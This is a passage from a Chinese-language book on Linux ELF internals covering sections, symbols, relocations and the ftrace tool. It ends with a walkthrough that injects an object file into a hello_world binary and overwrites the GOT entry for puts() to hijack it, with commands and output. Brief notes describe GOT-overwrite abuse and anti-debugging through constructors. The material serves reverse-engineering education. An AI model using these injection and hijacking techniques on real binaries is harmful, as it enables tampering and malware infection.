节头对于对我们正在查看的 ELF 对象的部分或节进行细粒度检查非常方便。事实上，节头使得逆向工程变得更加容易，因为它们为我们提供了使用某些需要它们的工具的能力。例如，如果节头表被剥离，那么我们就无法访问`.dynsym`这样的节，其中包含描述函数名称和偏移/地址的导入/导出符号。

### 注意

即使一个可执行文件的节头表被剥离，一个中等的逆向工程师实际上可以通过从某些程序头获取信息来重建节头表（甚至部分符号表），因为这些信息总是存在于程序或共享库中。我们之前讨论过动态段和包含有关符号表和重定位条目信息的不同`DT_TAG`。我们可以使用这些信息来重建可执行文件的其他部分，如第八章中所示的*ECFS – 扩展核心文件快照技术*。

以下是 32 位 ELF 节头的样子：

```
typedef struct {
uint32_t   sh_name; // offset into shdr string table for shdr name
    uint32_t   sh_type; // shdr type I.E SHT_PROGBITS
    uint32_t   sh_flags; // shdr flags I.E SHT_WRITE|SHT_ALLOC
    Elf32_Addr sh_addr;  // address of where section begins
    Elf32_Off  sh_offset; // offset of shdr from beginning of file
    uint32_t   sh_size;   // size that section takes up on disk
    uint32_t   sh_link;   // points to another section
    uint32_t   sh_info;   // interpretation depends on section type
uint32_t   sh_addralign; // alignment for address of section
uint32_t   sh_entsize;  // size of each certain entries that may be in section
} Elf32_Shdr;
```

让我们再次看一下一些最重要的节和节类型，同时留出空间来研究 ELF(5)手册页和官方 ELF 规范，以获取有关节的更详细信息。

## .text 节

`.text`部分是包含程序代码指令的代码部分。在可执行程序中，如果还有 Phdr's，此部分将位于文本段的范围内。因为它包含程序代码，所以它是部分类型`SHT_PROGBITS`。

## .rodata 部分

`rodata`部分包含只读数据，例如来自 C 代码行的字符串，例如以下命令存储在此部分中：

```
printf("Hello World!\n");
```

此部分是只读的，因此必须存在于可执行文件的只读段中。因此，您将在文本段的范围内找到`.rodata`（而不是数据段）。因为此部分是只读的，所以它是类型`SHT_PROGBITS`。

## .plt 部分

**过程链接表**（**PLT**）将在本章后面深入讨论，但它包含动态链接器调用从共享库导入的函数所需的代码。它位于文本段中，并包含代码，因此标记为类型`SHT_PROGBITS`。

## .data 部分

`data`部分，不要与数据段混淆，将存在于数据段中，并包含诸如初始化的全局变量之类的数据。它包含程序变量数据，因此标记为`SHT_PROGBITS`。

## .bss 部分

`bss`部分包含未初始化的全局数据作为数据段的一部分，因此除了代表该部分本身的 4 个字节外，在磁盘上不占用任何空间。数据在程序加载时初始化为零，并且数据可以在程序执行期间分配值。`bss`部分标记为`SHT_NOBITS`，因为它不包含实际数据。

## .got.plt 部分

**全局偏移表**（**GOT**）部分包含全局偏移表。这与 PLT 一起工作，以提供对导入的共享库函数的访问，并在运行时由动态链接器修改。这个部分特别经常被攻击者滥用，他们在堆或`.bss`漏洞中获得了指针大小的写入原语。我们将在本章的*ELF 动态链接*部分中讨论这一点。这个部分与程序执行有关，因此标记为`SHT_PROGBITS`。

## .dynsym 部分

`dynsym`部分包含从共享库导入的动态符号信息。它包含在文本段中，并标记为类型`SHT_DYNSYM`。

## .dynstr 部分

`dynstr`部分包含动态符号的字符串表，其中包含一系列以空字符结尾的每个符号的名称。

## .rel.*部分

重定位部分包含有关 ELF 对象或进程映像的部分需要在链接或运行时进行修复或修改的信息。我们将在本章的*ELF 重定位*部分中更多地讨论重定位。重定位部分标记为类型`SHT_REL`，因为它包含重定位数据。

## .hash 部分

`hash`部分，有时称为`.gnu.hash`，包含符号查找的哈希表。在 Linux ELF 中使用以下哈希算法进行符号名称查找：

```
uint32_t
dl_new_hash (const char *s)
{
        uint32_t h = 5381;

        for (unsigned char c = *s; c != '\0'; c = *++s)
                h = h * 33 + c;

        return h;
}
```

### 注意

`h = h * 33 + c`经常编码为`h = ((h << 5) + h) + c`

## .symtab 部分

`symtab`部分包含类型为`ElfN_Sym`的符号信息，我们将在本章的 ELF 符号和重定位部分中更仔细地分析。`symtab`部分标记为类型`SHT_SYMTAB`，因为它包含符号信息。

## .strtab 部分

`.strtab`部分包含由`.symtab`中的`ElfN_Sym`结构的`st_name`条目引用的符号字符串表，并标记为类型`SHT_STRTAB`，因为它包含字符串表。

## .shstrtab 部分

`shstrtab`部分包含节头字符串表，它是一组包含每个节的名称的空字符终止字符串，例如`.text`、`.data`等。这个部分由 ELF 文件头条目`e_shstrndx`指向，该条目保存了`.shstrtab`的偏移量。这个部分标记为`SHT_STRTAB`，因为它包含一个字符串表。

## .ctors 和.dtors 部分

`.ctors`（**构造函数**）和`.dtors`（**析构函数**）部分包含指向初始化和终结代码的函数指针，该代码将在实际`main()`程序代码体之前和之后执行。

### 注意

`__constructor__`函数属性有时被黑客和病毒作者使用，以实现执行反调试技巧的函数，例如调用`PTRACE_TRACEME`，以便进程跟踪自身，没有调试器可以附加到它。这样，反调试代码在程序进入`main()`之前执行。

还有许多其他部分名称和类型，但我们已经涵盖了大多数在动态链接可执行文件中找到的主要部分。现在可以通过`phdrs`和`shdrs`来可视化可执行文件的布局。

文本段将如下：

+   【.text】：这是程序代码

+   【.rodata】：这是只读数据

+   【.hash】：这是符号哈希表

+   【.dynsym】：这是共享对象符号数据

+   【.dynstr】：这是共享对象符号名称

+   【.plt】：这是过程链接表

+   【.rel.got】：这是 G.O.T 重定位数据

数据段将如下：

+   【.data】：这些是全局初始化变量

+   【.dynamic】：这些是动态链接结构和对象

+   【.got.plt】：这是全局偏移表

+   【.bss】：这些是全局未初始化变量

让我们看一下带有`readelf –S`命令的`ET_REL`文件（目标文件）部分头：

```
ryan@alchemy:~$ gcc -c test.c
ryan@alchemy:~$ readelf -S test.o
```

以下是 12 个部分头，从偏移 0x124 开始：

```
  [Nr] Name              Type            Addr           Off
       Size              ES              Flg  Lk   Inf   Al
  [ 0]                   NULL            00000000    000000
       000000            00                   0    0     0
  [ 1] .text             PROGBITS        00000000       000034
       000034            00              AX   0    0     4
  [ 2] .rel.text         REL             00000000       0003d0
       000010            08                   10   1     4
  [ 3] .data             PROGBITS        00000000 000068
       000000            00              WA   0    0     4
  [ 4] .bss              NOBITS          00000000       000068
       000000            00              WA   0    0     4
  [ 5] .comment          PROGBITS        00000000       000068
       00002b            01              MS   0    0     1
  [ 6] .note.GNU-stack   PROGBITS        00000000       000093
       000000            00                   0    0     1
  [ 7] .eh_frame         PROGBITS        00000000       000094
       000038            00              A    0    0     4
  [ 8] .rel.eh_frame     REL             00000000       0003e0
       000008            08                   10   7     4
  [ 9] .shstrtab         STRTAB          00000000       0000cc
       000057            00                   0    0     1
  [10] .symtab           SYMTAB          00000000       000304
       0000b0            10                   11   8     4
  [11] .strtab           STRTAB          00000000       0003b4
       00001a            00                   0    0     1
```

可重定位对象（类型为`ET_REL`的 ELF 文件）中不存在程序头，因为`.o`文件是用来链接到可执行文件的，而不是直接加载到内存中；因此，`readelf -l`在`test.o`上不会产生结果。Linux 可加载内核模块实际上是`ET_REL`对象，并且是一个例外，因为它们确实直接加载到内核内存中，并且在运行时重新定位。

我们可以看到我们讨论过的许多部分都存在，但也有一些不存在。如果我们将`test.o`编译成可执行文件，我们将看到许多新的部分已被添加，包括`.got.plt`、`.plt`、`.dynsym`和其他与动态链接和运行时重定位相关的部分：

```
ryan@alchemy:~$ gcc evil.o -o evil
ryan@alchemy:~$ readelf -S evil
```

以下是 30 个部分头，从偏移 0x1140 开始：

```
  [Nr] Name              Type            Addr           Off
       Size              ES              Flg  Lk  Inf   Al
  [ 0]                   NULL            00000000       000000
       000000            00                   0   0     0
  [ 1] .interp           PROGBITS        08048154       000154
       000013            00              A    0   0     1
  [ 2] .note.ABI-tag     NOTE            08048168       000168
       000020            00              A    0   0     4
  [ 3] .note.gnu.build-i NOTE            08048188       000188
       000024            00              A    0   0     4
  [ 4] .gnu.hash         GNU_HASH        080481ac       0001ac
       000020            04              A    5   0     4
  [ 5] .dynsym           DYNSYM          080481cc       0001cc
       000060            10              A    6   1     4
  [ 6] .dynstr           STRTAB          0804822c       00022c
       000052            00              A    0   0     1
  [ 7] .gnu.version      VERSYM          0804827e       00027e
       00000c            02              A    5   0     2
  [ 8] .gnu.version_r    VERNEED         0804828c       00028c
       000020            00              A    6   1     4
  [ 9] .rel.dyn          REL             080482ac       0002ac
       000008            08              A    5   0     4
  [10] .rel.plt          REL             080482b4       0002b4
       000020            08              A    5   12    4
  [11] .init             PROGBITS        080482d4       0002d4
       00002e            00              AX   0   0     4
  [12] .plt              PROGBITS        08048310       000310
       000050            04              AX   0   0     16
  [13] .text             PROGBITS        08048360       000360
       00019c            00              AX   0   0     16
  [14] .fini             PROGBITS        080484fc       0004fc
       00001a            00              AX   0   0     4
  [15] .rodata           PROGBITS        08048518       000518
       000008            00              A    0   0     4
  [16] .eh_frame_hdr     PROGBITS        08048520       000520
       000034            00              A    0   0     4
  [17] .eh_frame         PROGBITS        08048554       000554
       0000c4            00              A    0   0     4
  [18] .ctors            PROGBITS        08049f14       000f14
       000008            00              WA   0   0     4
  [19] .dtors            PROGBITS        08049f1c       000f1c
       000008            00              WA   0   0     4
  [20] .jcr              PROGBITS        08049f24       000f24
       000004            00              WA   0   0     4
  [21] .dynamic          DYNAMIC         08049f28       000f28
       0000c8            08              WA   6   0     4
  [22] .got              PROGBITS        08049ff0       000ff0
       000004            04              WA   0   0     4
  [23] .got.plt          PROGBITS        08049ff4       000ff4
       00001c            04              WA   0   0     4
  [24] .data             PROGBITS        0804a010       001010
       000008            00              WA   0   0     4
  [25] .bss              NOBITS          0804a018       001018
       000008            00              WA   0   0     4
  [26] .comment          PROGBITS        00000000       001018
       00002a            01              MS   0   0     1
  [27] .shstrtab         STRTAB          00000000       001042
       0000fc            00                   0   0     1
  [28] .symtab           SYMTAB          00000000       0015f0
       000420            10                   29  45    4
  [29] .strtab           STRTAB          00000000       001a10
       00020d            00                   0   0
```

正如观察到的，已经添加了许多部分，其中最重要的是与动态链接和构造函数相关的部分。我强烈建议读者跟随推断哪些部分已更改或添加以及添加部分的目的的练习。请参阅 ELF(5)手册页或 ELF 规范。

# ELF 符号

符号是对某种类型的数据或代码的符号引用，例如全局变量或函数。例如，`printf()`函数将在动态符号表`.dynsym`中有一个指向它的符号条目。在大多数共享库和动态链接的可执行文件中，存在两个符号表。在先前显示的`readelf -S`输出中，您可以看到两个部分：`.dynsym`和`.symtab`。

`.dynsym`包含引用外部源的全局符号，例如`libc`函数如`printf`，而`.symtab`中包含所有`.dynsym`中的符号，以及可执行文件中的本地符号，例如全局变量，或者您在代码中定义的本地函数。因此，`.symtab`包含所有符号，而`.dynsym`只包含动态/全局符号。

所以问题是：如果`.symtab`已经包含了`.dynsym`中的所有内容，为什么还要有两个符号表？如果您查看可执行文件的`readelf -S`输出，您会发现一些部分被标记为**A**（**ALLOC**）或**WA**（**WRITE/ALLOC**）或**AX**（**ALLOC/EXEC**）。如果您查看`.dynsym`，您会发现它被标记为 ALLOC，而`.symtab`没有标志。

ALLOC 表示该部分将在运行时分配并加载到内存中，`.symtab`不会加载到内存中，因为对于运行时来说是不必要的。`.dynsym`包含只能在运行时解析的符号，因此它们是动态链接器在运行时所需的唯一符号。因此，虽然`.dynsym`符号表对于动态链接可执行文件的执行是必要的，但`.symtab`符号表仅用于调试和链接目的，并且通常会从生产二进制文件中剥离以节省空间。

让我们看看 64 位 ELF 文件的 ELF 符号条目是什么样子的：

```
typedef struct {
uint32_t      st_name;
    unsigned char st_info;
    unsigned char st_other;
    uint16_t      st_shndx;
    Elf64_Addr    st_value;
    Uint64_t      st_size;
} Elf64_Sym;
```

符号条目包含在`.symtab`和`.dynsym`部分中，这就是为什么这些部分的`sh_entsize`（部分头条目大小）等于`sizeof(ElfN_Sym)`。

## st_name

`st_name`包含符号表字符串表（位于`.dynstr`或`.strtab`中）中符号名称的偏移量，比如`printf`。

## st_value

`st_value`保存符号的值（地址或位置的偏移量）。

## st_size

`st_size`包含符号的大小，比如全局函数`ptr`的大小，在 32 位系统上为 4 字节。

## st_other

该成员定义了符号的可见性。

## st_shndx

每个符号表条目都与某个部分*定义*相关。该成员保存相关部分头表索引。

## st_info

`st_info`指定符号类型和绑定属性。有关这些类型和属性的完整列表，请参阅**ELF(5) man page**。符号类型以 STT 开头，而符号绑定以 STB 开头。例如，一些常见的如下部分所述。

### 符号类型

我们有以下符号类型：

+   `STT_NOTYPE`：符号类型未定义

+   `STT_FUNC`：符号与函数或其他可执行代码相关联

+   `STT_OBJECT`：符号与数据对象相关联

### 符号绑定

我们有以下符号绑定：

+   `STB_LOCAL`：局部符号对包含其定义的目标文件之外不可见，比如声明为静态的函数。

+   `STB_GLOBAL`：全局符号对于所有被合并的目标文件都是可见的。一个文件对全局符号的定义将满足另一个文件对相同符号的未定义引用。

+   `STB_WEAK`：类似于全局绑定，但优先级较低，意味着绑定是弱的，可能会被另一个未标记为`STB_WEAK`的符号（具有相同名称）覆盖。

有用于打包和解包绑定和类型字段的宏：

+   `ELF32_ST_BIND(info)`或`ELF64_ST_BIND(info)`从`st_info`值中提取绑定

+   `ELF32_ST_TYPE(info)`或`ELF64_ST_TYPE(info)`从`st_info`值中提取类型

+   `ELF32_ST_INFO(bind, type)`或`ELF64_ST_INFO(bind, type)`将绑定和类型转换为`st_info`值

让我们看看以下源代码的符号表：

```
static inline void foochu()
{ /* Do nothing */ }

void func1()
{ /* Do nothing */ }

_start()
{
        func1();
        foochu();
}
```

以下是查看函数`foochu`和`func1`的符号表条目的命令：

```
ryan@alchemy:~$ readelf -s test | egrep 'foochu|func1'
     7: 080480d8     5 FUNC    LOCAL  DEFAULT    2 foochu
     8: 080480dd     5 FUNC    GLOBAL DEFAULT    2 func1
```

我们可以看到`foochu`函数的值为`0x80480da`，是一个函数（`STT_FUNC`），具有局部符号绑定（`STB_LOCAL`）。如果你还记得，我们稍微谈到了`LOCAL`绑定，这意味着该符号在定义它的目标文件之外是不可见的，这就是为什么`foochu`是局部的，因为我们在源代码中使用了**static 关键字**声明它。

符号对每个人都更容易，它们是 ELF 对象的一部分，用于链接、重定位、可读的反汇编和调试。这让我想到了一个我在 2013 年编写的有用工具的话题，名为`ftrace`。类似于`ltrace`和`strace`，`ftrace`将跟踪二进制文件中进行的所有函数调用，并且还可以显示其他分支指令，比如跳转。我最初设计`ftrace`是为了帮助我在工作中没有源代码的情况下对二进制文件进行逆向。`ftrace`被认为是一种动态分析工具。让我们来看一下它的一些功能。我们用以下源代码编译一个二进制文件：

```
#include <stdio.h>

int func1(int a, int b, int c)
{
  printf("%d %d %d\n", a, b ,c);
}

int main(void)
{
  func1(1, 2, 3);
}
```

现在，假设我们没有前面的源代码，我们想知道它编译成的二进制文件的内部工作原理，我们可以在其上运行`ftrace`。首先让我们看一下概要：

```
ftrace [-p <pid>] [-Sstve] <prog>
```

用法如下：

+   `[-p]`：这按 PID 进行跟踪

+   `[-t]`：这是用于函数参数类型检测

+   `[-s]`：这会打印字符串值

+   `[-v]`：这提供详细输出

+   `[-e]`：这提供杂项 ELF 信息（符号、依赖项）

+   `[-S]`：这显示带有剥离符号的函数调用

+   `[-C]`：这完成控制流分析

让我们试一试：

```
ryan@alchemy:~$ ftrace -s test
[+] Function tracing begins here:
PLT_call@0x400420:__libc_start_main()
LOCAL_call@0x4003e0:_init()
(RETURN VALUE) LOCAL_call@0x4003e0: _init() = 0
LOCAL_call@0x40052c:func1(0x1,0x2,0x3)  // notice values passed
PLT_call@0x400410:printf("%d %d %d\n")  // notice we see string value
1 2 3
(RETURN VALUE) PLT_call@0x400410: printf("%d %d %d\n") = 6
(RETURN VALUE) LOCAL_call@0x40052c: func1(0x1,0x2,0x3) = 6
LOCAL_call@0x400470:deregister_tm_clones()
(RETURN VALUE) LOCAL_call@0x400470: deregister_tm_clones() = 7
```

一个聪明的人现在可能会问：如果二进制文件的符号表被剥离了会发生什么？没错，你可以剥离二进制文件的符号表；但是，动态链接的可执行文件将始终保留`.dynsym`，但如果被剥离，将丢弃`.symtab`，因此只有导入的库符号会显示出来。

如果二进制文件是静态编译的（`gcc-static`）或没有`libc`链接（`gcc-nostdlib`），然后用`strip`命令剥离，二进制文件将不再有符号表，因为动态符号表不再是必要的。`ftrace`在使用`-S`标志时的行为与众不同，该标志告诉`ftrace`即使没有符号附加到它，也要显示每个函数调用。使用`-S`标志时，`ftrace`将显示函数名称为`SUB_<address_of_function>`，类似于 IDA pro 将显示没有符号表引用的函数。

让我们看一下以下非常简单的源代码：

```
int foo(void) {
}

_start()
{
  foo();
  __asm__("leave");
}
```

前面的源代码只是调用了`foo()`函数然后退出。我们使用`_start()`而不是`main()`的原因是因为我们用以下方式编译它：

```
gcc -nostdlib test2.c -o test2
```

`gcc`标志`-nostdlib`指示链接器省略标准的`libc`链接约定，只需编译我们拥有的代码，而不多余的东西。默认的入口点是一个名为`_start()`的符号：

```
ryan@alchemy:~$ ftrace ./test2
[+] Function tracing begins here:
LOCAL_call@0x400144:foo()
(RETURN VALUE) LOCAL_call@0x400144: foo() = 0
Now let's strip the symbol table and run ftrace on it again:
ryan@alchemy:~$ strip test2
ryan@alchemy:~$ ftrace -S test2
[+] Function tracing begins here:
LOCAL_call@0x400144:sub_400144()
(RETURN VALUE) LOCAL_call@0x400144: sub_400144() = 0
```

我们现在注意到`foo()`函数已被`sub_400144()`替换，这表明函数调用发生在地址`0x400144`。现在如果我们在剥离符号之前看`test2`二进制文件，我们可以看到`0x400144`确实是`foo()`所在的地方：

```
ryan@alchemy:~$ objdump -d test2
test2:     file format elf64-x86-64
Disassembly of section .text:
0000000000400144<foo>:
  400144:   55                      push   %rbp
  400145:   48 89 e5                mov    %rsp,%rbp
  400148:   5d                      pop    %rbp
  400149:   c3                      retq   

000000000040014a <_start>:
  40014a:   55                      push   %rbp
  40014b:   48 89 e5                mov    %rsp,%rbp
  40014e:   e8 f1 ff ff ff          callq  400144 <foo>
  400153:   c9                      leaveq
  400154:   5d                      pop    %rbp
  400155:   c3                 retq
```

事实上，为了让你真正了解符号对逆向工程师（当我们拥有它们时）有多么有帮助，让我们看看`test2`二进制文件，这次没有符号，以演示它变得稍微不那么容易阅读。这主要是因为分支指令不再附有符号名称，因此分析控制流变得更加繁琐，需要更多的注释，而一些反汇编器如 IDA-pro 允许我们在进行时进行注释：

```
$ objdump -d test2
test2:     file format elf64-x86-64
Disassembly of section .text:
0000000000400144 <.text>:
  400144:   55                      push   %rbp  
  400145:   48 89 e5                mov    %rsp,%rbp
  400148:   5d                      pop    %rbp
  400149:   c3                      retq   
  40014a:   55                      push   %rbp 
  40014b:   48 89 e5                mov    %rsp,%rbp
  40014e:   e8 f1 ff ff ff          callq  0x400144
  400153:   c9                      leaveq
  400154:   5d                      pop    %rbp
  400155:   c3                      retq   
```

唯一能让我们知道新函数从哪里开始的方法是检查**过程序言**，它位于每个函数的开头，除非使用了(`gcc -fomit-frame-pointer`)，在这种情况下，识别起来就不那么明显了。

本书假设读者已经对汇编语言有一些了解，因为教授 x86 汇编不是本书的目标，但请注意前面加粗的过程序言，它有助于标明每个函数的开始。过程序言只是为每个被调用的新函数设置堆栈帧，通过在堆栈上备份基指针并将其值设置为在调整堆栈指针之前的堆栈指针的值。这样变量可以作为基指针寄存器`ebp/rbp`中存储的固定地址的正偏移来引用。

现在我们已经对符号有了一定的了解，下一步是理解重定位。在下一节中，我们将看到符号、重定位和部分如何紧密地联系在一起，并在 ELF 格式中处于相同的抽象层级。

# ELF 重定位

来自 ELF(5)手册页：

> *重定位是将符号引用与符号定义连接起来的过程。可重定位文件必须具有描述如何修改其部分内容的信息，从而允许可执行文件和共享对象文件保存进程的程序映像所需的正确信息。重定位条目就是这些数据。*

重定位的过程依赖于符号和部分，这就是为什么我们首先介绍符号和部分。在重定位中，有*重定位记录*，它们基本上包含了有关如何修补与给定符号相关的代码的信息。重定位实际上是一种用于二进制修补甚至在动态链接器涉及时在内存中进行热修补的机制。链接器程序：`/bin/ld`用于创建可执行文件和共享库，必须具有描述如何修补某些指令的元数据。这些元数据被存储为我们所谓的重定位记录。我将通过一个例子进一步解释重定位。

想象一下，有两个目标文件链接在一起创建可执行文件。我们有`obj1.o`包含调用名为`foo()`的函数的代码，该函数位于`obj2.o`中。链接器程序分析了`obj1.o`和`obj2.o`，并包含了重定位记录，以便它们可以链接在一起创建一个完全可工作的可执行程序。符号引用将被解析为符号定义，但这究竟是什么意思呢？目标文件是可重定位代码，这意味着它是代码，旨在被重定位到可执行段内的给定地址。在重定位过程发生之前，代码具有符号和代码，这些符号和代码在不知道它们在内存中的位置之前将无法正常工作或无法正确引用。这些必须在链接器首先知道它们在可执行段内的位置之后进行修补。

让我们快速看一下 64 位重定位条目：

```
typedef struct {
        Elf64_Addr r_offset;
        Uint64_t   r_info;
} Elf64_Rel;
```

有些重定位条目需要一个加数：

```
typedef struct {
        Elf64_Addr r_offset;
        uint64_t   r_info;
        int64_t    r_addend;
} Elf64_Rela;
```

`r_offset`指向需要进行重定位操作的位置。重定位操作描述了如何修补`r_offset`处包含的代码或数据的详细信息。

`r_info`给出了必须进行重定位的符号表索引以及要应用的重定位类型。

`r_addend`指定了用于计算可重定位字段中存储的值的常数加数。

32 位 ELF 文件的重定位记录与 64 位相同，但使用 32 位整数。以下示例将编译为 32 位的目标文件代码，以便我们可以演示**隐式加数**，这在 64 位中不常用。当重定位记录存储在不包含`r_addend`字段的 ElfN_Rel 类型结构中时，隐式加数就会发生，因此加数存储在重定位目标本身中。64 位可执行文件倾向于使用包含**显式加数**的`ElfN_Rela`结构。我认为值得理解这两种情况，但隐式加数有点更令人困惑，因此有必要对这一领域进行阐明。

让我们来看一下源代码：

```
_start()
{
   foo();
}
```

我们看到它调用了`foo()`函数。但是，`foo()`函数并不直接位于该源代码文件中；因此，在编译时，将创建一个重定位条目，以满足以后对符号引用的需求：

```
$ objdump -d obj1.o
obj1.o:     file format elf32-i386
Disassembly of section .text:
00000000 <func>:
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   83 ec 08                sub    $0x8,%esp
   6:   e8 fc ff ff ff          call 7 <func+0x7>
   b:   c9                      leave  
   c:   c3                      ret   
```

正如我们所看到的，对`foo()`的调用被突出显示，并包含值`0xfffffffc`，这是*隐式加数*。还要注意`call 7`。数字`7`是要修补的重定位目标的偏移量。因此，当`obj1.o`（调用位于`obj2.o`中的`foo()`）与`obj2.o`链接以生成可执行文件时，链接器会处理指向偏移量`7`的重定位条目，告诉它需要修改的位置（偏移量 7）。然后，链接器会修补偏移量 7 处的 4 个字节，使其包含`foo()`函数的真实偏移量，`foo()`在可执行文件中的某个位置。

### 注意

调用指令`e8 fc ff ff ff`包含隐式加数，对于这节课很重要；值`0xfffffffc`是`-(4)`或`-(sizeof(uint32_t))`。在 32 位系统上，一个双字是 4 个字节，这是重定位目标的大小。

```
$ readelf -r obj1.o

Relocation section '.rel.text' at offset 0x394 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00000007  00000902 R_386_PC32        00000000   foo
```

正如我们所看到的，偏移量为 7 的重定位字段由重定位条目的`r_offset`字段指定。

+   `R_386_PC32`是重定位类型。要了解所有这些类型，请阅读 ELF 规范。每种重定位类型都需要对被修改的重定位目标进行不同的计算。`R_386_PC32`使用`S + A - P`修改目标。

+   `S`是重定位条目中索引的符号的值。

+   `A`是在重定位条目中找到的加数。

+   `P`是被重定位的存储单元的位置（段偏移量或地址）（使用`r_offset`计算）。

让我们看看在 32 位系统上编译`obj1.o`和`obj2.o`后，我们的可执行文件的最终输出：

```
$ gcc -nostdlib obj1.o obj2.o -o relocated
$ objdump -d relocated

test:     file format elf32-i386

Disassembly of section .text:

080480d8 <func>:
 80480d8:   55                      push   %ebp
 80480d9:   89 e5                   mov    %esp,%ebp
 80480db:   83 ec 08                sub    $0x8,%esp
 80480de:   e8 05 00 00 00          call   80480e8 <foo>
 80480e3:   c9                      leave  
 80480e4:   c3                      ret    
 80480e5:   90                      nop
 80480e6:   90                      nop
 80480e7:   90                      nop

080480e8 <foo>:
 80480e8:   55                      push   %ebp
 80480e9:   89 e5                   mov    %esp,%ebp
 80480eb:   5d                      pop    %ebp
 80480ec:   c3                      ret
```

我们可以看到，调用指令**(重定位目标)在 0x80480de**处已被修改为 32 位偏移值`5`，指向`foo()`。值`5`是`R386_PC_32`重定位操作的结果：

```
S + A – P: 0x80480e8 + 0xfffffffc – 0x80480df = 5
```

`0xfffffffc`与有符号整数中的`-4`相同，因此计算也可以看作：

```
0x80480e8 + (0x80480df + sizeof(uint32_t))
```

要计算虚拟地址的偏移量，请使用以下计算：

```
address_of_call + offset + 5 (Where 5 is the length of the call instruction)
```

在这种情况下是`0x80480de + 5 + 5 = 0x80480e8`。

### 注意

请注意这个计算，因为它很重要并且在频繁计算地址偏移时可以使用。

地址也可以通过以下计算得出偏移量：

```
address – address_of_call – 4 (Where 4 is the length of the immediate operand to the call instruction, which is 32bits).
```

如前所述，ELF 规范详细介绍了 ELF 重定位，并且我们将在下一节中讨论一些在动态链接中使用的类型，例如`R386_JMP_SLOT`重定位条目。

## 基于可重定位代码注入的二进制修补

可重定位代码注入是黑客、病毒作者或任何想要修改二进制代码的人可能利用的一种技术，作为一种在编译和链接为可执行文件之后重新链接二进制文件的方式。也就是说，您可以将一个目标文件注入到可执行文件中，更新可执行文件的符号表以反映新插入的功能，并对注入的目标代码执行必要的重定位，使其成为可执行文件的一部分。

一个复杂的病毒可能会使用这种技术，而不仅仅是附加位置无关代码。这种技术需要在目标可执行文件中腾出空间来注入代码，然后应用重定位。我们将在第四章中更全面地介绍二进制感染和代码注入，*ELF 病毒技术- Linux/Unix 病毒*。

如第一章中所述，*Linux 环境及其工具*，有一个名为*Eresi*（[`www.eresi-project.org`](http://www.eresi-project.org)）的神奇工具，它能够进行可重定位代码注入（又称`ET_REL`注入）。我还设计了一个用于 ELF 的自定义逆向工程工具，名为**Quenya**。它非常古老，但可以在[`www.bitlackeys.org/projects/quenya_32bit.tgz`](http://www.bitlackeys.org/projects/quenya_32bit.tgz)上找到。Quenya 具有许多功能和能力，其中之一就是将目标代码注入到可执行文件中。这对于通过劫持给定函数来修补二进制文件非常有用。Quenya 只是一个原型，从未像*Eresi*项目那样得到发展。我之所以使用它作为示例，是因为我对它更熟悉；然而，我会说，为了更可靠的结果，也许最好使用*Eresi*或编写自己的工具。

让我们假装我们是攻击者，我们想要感染一个调用`puts()`打印`Hello World`的 32 位程序。我们的目标是劫持`puts()`，使其调用`evil_puts()`：

```
#include <sys/syscall.h>
int _write (int fd, void *buf, int count)
{
  long ret;

  __asm__ __volatile__ ("pushl %%ebx\n\t"
"movl %%esi,%%ebx\n\t"
"int $0x80\n\t""popl %%ebx":"=a" (ret)
                        :"0" (SYS_write), "S" ((long) fd),
"c" ((long) buf), "d" ((long) count));
  if (ret >= 0) {
    return (int) ret;
  }
  return -1;
}
int evil_puts(void)
{
        _write(1, "HAHA puts() has been hijacked!\n", 31);
}
```

现在我们将`evil_puts.c`编译成`evil_puts.o`并将其注入到名为`./hello_world`的程序中：

```
$ ./hello_world
Hello World
```

这个程序调用以下内容：

```
puts("Hello World\n");
```

现在我们使用`Quenya`将我们的`evil_puts.o`文件注入和重定位到`hello_world`中：

```
[Quenya v0.1@alchemy] reloc evil_puts.o hello_world
0x08048624  addr: 0x8048612
0x080485c4 _write addr: 0x804861e
0x080485c4  addr: 0x804868f
0x080485c4  addr: 0x80486b7
Injection/Relocation succeeded
```

我们可以看到，来自我们的`evil_puts.o`目标文件的`write()`函数已经被重定位，并在可执行文件`hello_world`中分配了一个地址`0x804861e`。下一个命令劫持并覆盖了`puts()`的全局偏移表条目，将其地址替换为`evil_puts()`的地址：

```
[Quenya v0.1@alchemy] hijack binary hello_world evil_puts puts
Attempting to hijack function: puts
Modifying GOT entry for puts
Successfully hijacked function: puts
Committing changes into executable file
[Quenya v0.1@alchemy] quit
```

然后就成功了！

```
ryan@alchemy:~/quenya$ ./hello_world
HAHA puts() has been hijacked!
```

我们已经成功地将一个目标文件重定位到一个可执行文件中，并修改了可执行文件的控制流，使其执行我们注入的代码。如果我们在`hello_world`上使用`readelf -s`，我们现在实际上可以看到一个`evil_puts()`的符号。

为了您的兴趣，我已经包含了一个包含 Quenya ELF 重定位机制的小代码片段；如果没有看到代码库的其余部分，它可能有点晦涩，但如果您记住了我们学到的关于重定位的知识，它也是相当直接的。

```
switch(obj.shdr[i].sh_type)
{
case SHT_REL: /* Section contains ElfN_Rel records */
rel = (Elf32_Rel *)(obj.mem + obj.shdr[i].sh_offset);
for (j = 0; j < obj.shdr[i].sh_size / sizeof(Elf32_Rel); j++, rel++)
{
/* symbol table */ 
symtab = (Elf32_Sym *)obj.section[obj.shdr[i].sh_link]; 

/* symbol we are applying relocation to */
symbol = &symtab[ELF32_R_SYM(rel->r_info)];

/* section to modify */
TargetSection = &obj.shdr[obj.shdr[i].sh_info];
TargetIndex = obj.shdr[i].sh_info;

/* target location */
TargetAddr = TargetSection->sh_addr + rel->r_offset;

/* pointer to relocation target */
RelocPtr = (Elf32_Addr *)(obj.section[TargetIndex] + rel->r_offset);

/* relocation value */
RelVal = symbol->st_value; 
RelVal += obj.shdr[symbol->st_shndx].sh_addr;

printf("0x%08x %s addr: 0x%x\n",RelVal, &SymStringTable[symbol->st_name], TargetAddr);

switch (ELF32_R_TYPE(rel->r_info)) 
{
/* R_386_PC32      2    word32  S + A - P */ 
case R_386_PC32:
*RelocPtr += RelVal;
*RelocPtr -= TargetAddr;
break;

/* R_386_32        1    word32  S + A */
case R_386_32:
*RelocPtr += RelVal;
     break;
 } 
}
```

如前面的代码所示，`RelocPtr`指向的重定位目标将根据重定位类型（如`R_386_32`）请求的重定位操作进行修改。

